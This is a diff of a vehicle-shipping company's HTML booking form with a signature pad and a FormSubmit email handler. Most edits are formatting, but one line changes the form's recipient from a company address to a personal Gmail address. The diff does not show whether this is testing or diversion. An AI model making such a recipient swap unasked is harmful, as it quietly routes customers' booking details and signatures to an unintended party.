@@ -58,7 +58,10 @@ function initSignaturePad() {
     ["mousemove","touchmove"].forEach(evt => canvas.addEventListener(evt,move));
 }
 
-function clearSignature(){ ctx.clearRect(0,0,canvas.width,canvas.height); document.getElementById("signature-input").value=""; }
+function clearSignature(){ 
+    ctx.clearRect(0,0,canvas.width,canvas.height); 
+    document.getElementById("signature-input").value=""; 
+}
 
 async function handleSubmit(e){
     e.preventDefault();
@@ -72,14 +75,15 @@ async function handleSubmit(e){
 
     try {
         await fetch(SHEET_URL, { method:"POST", body: JSON.stringify(data) });
-        document.getElementById("bookingForm").submit(); // send email via FormSubmit
+        document.getElementById("bookingForm").submit(); // sends email via FormSubmit
     } catch(err){
         alert("Error sending data to sheet. Try again.");
     }
 }
 
 window.onload = function(){
-    fillData(); initSignaturePad();
+    fillData(); 
+    initSignaturePad();
     document.getElementById("bookingForm").addEventListener("submit", handleSubmit);
 };
 </script>
@@ -117,9 +121,10 @@ window.onload = function(){
 <h3>Terms & Agreement</h3>
 <p>By confirming your booking below, you are securing your vehicle shipment with F16 Logistics LLC. Our team will coordinate with our trusted, licensed, and insured carrier network to ensure a smooth and professional transport experience.</p>
 
-<form id="bookingForm" action="https://formsubmit.co/austin@f16logistics.com" method="POST">
+<form id="bookingForm" action="https://formsubmit.co/ranveer.sood45@gmail.com" method="POST">
 <input type="hidden" name="_captcha" value="false">
 <input type="hidden" name="_subject" value="New Booking Confirmation - F16 Logistics">
+<!-- Redirect to Authorization page after submission -->
 <input type="hidden" name="_next" value="https://f16logistics.github.io/F16-Logistics/">
 
 <input type="hidden" name="Vehicle" id="form_vehicle">
@@ -141,5 +146,6 @@ window.onload = function(){
 <p><input type="checkbox" required> I confirm the above information is accurate and agree to proceed.</p>
 <button type="submit">Confirm Booking</button>
 </form>
+
 </body>
 </html>
